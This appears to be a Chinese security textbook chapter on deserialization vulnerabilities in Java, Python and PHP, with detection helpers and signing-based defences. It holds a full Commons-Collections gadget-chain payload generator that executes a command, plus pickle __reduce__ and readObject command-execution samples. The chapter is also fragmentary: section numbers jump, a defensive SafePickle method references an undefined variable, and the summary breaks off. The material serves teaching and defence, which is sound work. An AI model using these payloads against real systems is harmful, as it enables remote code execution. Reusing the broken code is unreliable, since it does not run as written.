# 第13章 反序列化漏洞挖掘

## 13.1 反序列化原理

### 13.1.1 什么是序列化与反序列化

**序列化（Serialization）**是将对象转换为可存储或传输的格式（如字节流、JSON、XML等）的过程。**反序列化（Deserialization）**则是将序列化后的数据恢复为原始对象的过程。

**序列化的主要用途：**

| 用途 | 说明 |
|------|------|
| 数据持久化 | 将对象保存到文件或数据库 |
| 数据传输 | 在网络中传输对象数据 |
| 远程调用 | RPC/RMI通信 |
| 缓存存储 | 将对象缓存到内存或磁盘 |
| 跨进程通信 | 进程间数据交换 |

**序列化格式对比：**

| 格式 | 语言支持 | 安全性 | 性能 | 可读性 |
|------|----------|--------|------|--------|
| Java原生序列化 | Java | 低 | 中 | 不可读 |
| JSON | 多语言 | 中 | 低 | 高 |
| XML | 多语言 | 中 | 低 | 高 |
| YAML | 多语言 | 中 | 低 | 高 |
| Protocol Buffers | 多语言 | 高 | 高 | 不可读 |
| Pickle | Python | 低 | 高 | 不可读 |

### 13.1.2 反序列化漏洞原理

**漏洞本质：**

反序列化漏洞的核心问题是：当应用程序反序列化不可信的数据时，攻击者可以构造恶意数据，导致在反序列化过程中执行任意代码或触发非预期的行为。

**漏洞产生原因：**

1. **自动执行魔法方法**：许多语言在反序列化时会自动调用对象的特殊方法（如Java的readObject、Python的__reduce__）
2. **对象注入**：攻击者可注入任意对象，利用对象的属性和方法
3. **类型混淆**：反序列化可能导致类型不匹配，引发异常行为
4. **依赖链攻击**：利用已存在的类和方法构造攻击链（Gadget Chain）

**漏洞影响：**

| 影响类型 | 严重程度 | 说明 |
|----------|----------|------|
| 远程代码执行 | 严重 | 执行任意系统命令 |
| 拒绝服务 | 高 | 消耗资源导致服务崩溃 |
| 权限提升 | 高 | 获取更高权限 |
| 信息泄露 | 中 | 泄露敏感数据 |
| 认证绕过 | 中 | 绕过认证机制 |

### 13.1.3 反序列化漏洞分类

**按语言分类：**

| 语言 | 序列化方式 | 漏洞特点 |
|------|------------|----------|
| Java | Java原生序列化、XML、JSON | Gadget Chain攻击 |
| PHP | serialize/unserialize | 魔法方法自动调用 |
| Python | pickle、yaml | __reduce__方法利用 |
| .NET | BinaryFormatter、JSON | ViewState攻击 |
| Ruby | Marshal、YAML | 对象注入 |

**按攻击类型分类：**

| 类型 | 说明 | 示例 |
|------|------|------|
| 原生反序列化 | 使用语言原生序列化机制 | Java ObjectInputStream |
| JSON/XML反序列化 | 使用第三方库反序列化 | Jackson、Fastjson |
| YAML反序列化 | YAML解析器漏洞 | PyYAML、SnakeYAML |
| 自定义协议 | 自定义序列化格式 | 特定应用协议 |

```python
import base64

def detect_serialization_format(data):
    """识别序列化格式"""
    try:
        if isinstance(data, str):
            # 尝试Base64解码
            try:
                decoded = base64.b64decode(data)
            except:
                decoded = data.encode()
        else:
            decoded = data
        
        # 检测Java序列化
        if decoded[:4] == bytes([0xAC, 0xED, 0x00, 0x05]):
            return "Java原生序列化"
        
        # 检测PHP序列化
        if decoded[:2] == b'O:' or decoded[:2] == b'a:' or decoded[:2] == b's:':
            return "PHP序列化"
        
        # 检测Python pickle
        pickle_markers = [b'\x80\x00', b'\x80\x01', b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05']
        if decoded[:2] in pickle_markers:
            return "Python pickle"
        
        # 检测JSON
        try:
            import json
            json.loads(data)
            return "JSON"
        except:
            pass
        
        # 检测YAML
        if b'!!python' in decoded or b'!ruby' in decoded:
            return "YAML"
        
        # 检测XML
        if b'<?xml' in decoded[:20] or b'<root>' in decoded[:20]:
            return "XML"
        
        # 检测ViewState
        if b'__VIEWSTATE' in data.encode() or len(data) > 100 and data[0] in ['/', 'd']:
            return ".NET ViewState"
        
        return "未知格式"
    except:
        return "无法识别"

# 使用示例
data = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUHShsPJQ..."
print(f"序列化格式: {detect_serialization_format(data)}")
```

## 13.3 Java反序列化漏洞

### 13.2.1 Java序列化基础

**Java原生序列化机制：**

Java提供了ObjectOutputStream和ObjectInputStream类用于对象的序列化和反序列化。

```java
// 序列化
import java.io.*;

public class SerializationExample {
    public static void serialize(Object obj, String filename) throws IOException {
        FileOutputStream fos = new FileOutputStream(filename);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
        fos.close();
    }
    
    public static Object deserialize(String filename) throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(filename);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        fis.close();
        return obj;
    }
}

// 可序列化的类
class User implements Serializable {
    private static final long serialVersionUID = 1L;
    private String username;
    private String password;
    
    // 魔法方法：readObject
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 自定义反序列化逻辑
        System.out.println("User对象被反序列化");
    }
}
```

**Java序列化数据格式：**

Java序列化数据以二进制格式存储，以特定标记开头：

```
AC ED 00 05  // Java序列化魔术字节
```

**识别Java序列化数据：**

```python
import base64

def is_java_serialization(data):
    """检测是否为Java序列化数据"""
    if isinstance(data, str):
        data = base64.b64decode(data)
    
    # 检查魔术字节
    magic_bytes = bytes([0xAC, 0xED, 0x00, 0x05])
    
    if data[:4] == magic_bytes:
        return True
    
    # 检查RMI标记
    if data[:2] == bytes([0xAC, 0xED]):
        return True
    
    return False

# 使用示例
data = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUHShsPJQ..."
print(is_java_serialization(data))  # True
```

### 13.2.2 Java反序列化漏洞原理

**漏洞触发点：**

Java反序列化漏洞的关键在于`ObjectInputStream.readObject()`方法。当调用该方法时：

1. 读取对象的类描述符
2. 创建对象实例
3. 调用对象的`readObject()`方法（如果存在）
4. 恢复对象状态

**魔法方法利用：**

```java
// 漏洞示例：危险的readObject方法
class VulnerableClass implements Serializable {
    private String command;
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        
        // 危险：执行命令
        Runtime.getRuntime().exec(command);
    }
}
```

**Gadget Chain（攻击链）：**

Java反序列化攻击通常需要构造Gadget Chain，即一系列可被利用的类和方法链。

**常见Gadget Chain：**

| 名称 | 说明 | 影响版本 |
|------|------|----------|
| Commons-Collections | Apache Commons Collections利用链 | 3.1-3.2.1 |
| Commons-BeanUtils | Apache Commons BeanUtils利用链 | 1.6-1.9.2 |
| Spring | Spring Framework利用链 | 多版本 |
| JDK7u21 | JDK内置类利用链 | JDK 7u21之前 |
| JDK8u20 | JDK内置类利用链 | JDK 8u20之前 |
| Groovy | Groovy库利用链 | 多版本 |

### 13.2.3 Commons-Collections利用链

**漏洞概述：**

Apache Commons Collections是Java最常用的工具库之一，其InvokerTransformer类存在严重的反序列化漏洞。

**利用链分析：**

```
AnnotationInvocationHandler.readObject()
  -> HashMap.entrySet()
    -> LazyMap.get()
      -> ChainedTransformer.transform()
        -> InvokerTransformer.transform()
          -> Runtime.exec()
```

**漏洞利用：**

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.util.*;
import java.lang.reflect.*;

public class CommonsCollectionsPayload {
    public static Object generatePayload(String command) throws Exception {
        // 构造Transformer链
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[] {String.class, Class[].class},
                new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class},
                new Object[] {null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[] {String.class},
                new Object[] {command})
        };
        
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        
        // 创建LazyMap
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        
        // 创建AnnotationInvocationHandler
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Override.class, lazyMap);
        
        return instance;
    }
    
    public static void main(String[] args) throws Exception {
        Object payload = generatePayload("calc.exe");
        
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(payload);
        oos.close();
        
        // 反序列化触发漏洞
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

### 13.4.2 pickle漏洞原理

**漏洞触发点：**

pickle在反序列化时会调用对象的`__reduce__`方法，该方法返回一个元组，描述如何重建对象：

```python
def __reduce__(self):
    return (function, (args, ...))
```

反序列化时会执行：

```python
function(args, ...)
```

**漏洞示例：**

```python
import pickle
import os

class MaliciousClass:
    def __reduce__(self):
        # 返回os.system函数和参数
        return (os.system, ('whoami',))

# 反序列化触发漏洞
pickle.loads(payload)  # 执行whoami命令
```

**__reduce__返回值格式：**

```python
# 格式1：函数调用
return (function, (arg1, arg2, ...))

# 格式2：函数调用+状态设置
return (function, (args, ...), state)

# 格式3：列表迭代器
return (function, (args, ...), state, list_iterator)

# 格式4：字典迭代器
return (function, (args, ...), state, dict_iterator)
```

## 13.9 反序列化漏洞防护

### 13.9.1 安全序列化原则

**基本原则：**

1. **避免使用原生序列化**：使用JSON、XML等安全格式
2. **验证数据来源**：确保反序列化数据来自可信源
3. **限制反序列化类型**：使用白名单限制可反序列化的类
4. **签名验证**：对序列化数据进行签名验证
5. **加密保护**：对敏感数据进行加密

**安全序列化方式对比：**

| 方式 | 安全性 | 适用场景 |
|------|--------|----------|
| JSON | 高 | 数据交换、API通信 |
| XML | 中 | 配置文件、数据交换 |
| Protocol Buffers | 高 | 高性能通信 |
| 自定义协议 | 高 | 特定需求 |
| 原生序列化 | 低 | 避免使用 |

**3. 使用签名验证**

```php
class SignedSerializer {
    private $secret;
    
    public function serialize($data) {
        $serialized = serialize($data);
        $signature = hash_hmac('sha256', $serialized, $this->secret);
        return base64_encode($serialized . '|' . $signature);
    }
    
    public function unserialize($data) {
        $decoded = base64_decode($data);
        $parts = explode('|', $decoded);
        
        if (count($parts) != 2) {
            throw new Exception("Invalid format");
        }
        
        $serialized = $parts[0];
        $signature = $parts[1];
        
        $expected = hash_hmac('sha256', $serialized, $this->secret);
        
        if (!hash_equals($expected, $signature)) {
            throw new Exception("Invalid signature");
        }
        
        return unserialize($serialized);
    }
}
```

**2. 使用pickle时添加验证**

```python
import hmac
import hashlib

class SafePickle:
    def __init__(self, secret):
        self.secret = secret
    
    def dumps(self, obj):
        data = pickle.dumps(obj)
        signature = hmac.new(self.secret, data, hashlib.sha256).hexdigest()
        return f"{signature}:{data.hex()}"
    
    def loads(self, data):

        if len(parts) != 2:
            raise ValueError("Invalid format")
        
        signature = parts[0]
        pickled_data = bytes.fromhex(parts[1])
        
        expected = hmac.new(self.secret, pickled_data, hashlib.sha256).hexdigest()
        
        if not hmac.compare_digest(signature, expected):
            raise ValueError("Invalid signature")
        
        return pickle.loads(pickled_data)
```

## 13.11 本章小结

本章详细介绍了反序列化漏洞挖掘的各个方面：

**主要知识点：**

1. **反序列化原理**：了解了序列化与反序列化的概念、漏洞原理和分类。

4. **Python反序列化漏洞**：了解了pickle漏洞原理、__reduce__方法利用、YAML反序列化漏洞等。

7. **防护措施**：学习了各语言的安全序列化原则和具体防护方法。

**关键要点：**

- 反序列化漏洞是严重的远程代码执行漏洞
- 不同语言的漏洞原理各有特点
- Gadget Chain是Java漏洞的核心
- POP链是PHP漏洞的关键
- __reduce__是Python漏洞的入口
- 使用安全的序列化格式是最好的防护

**实践建议：**
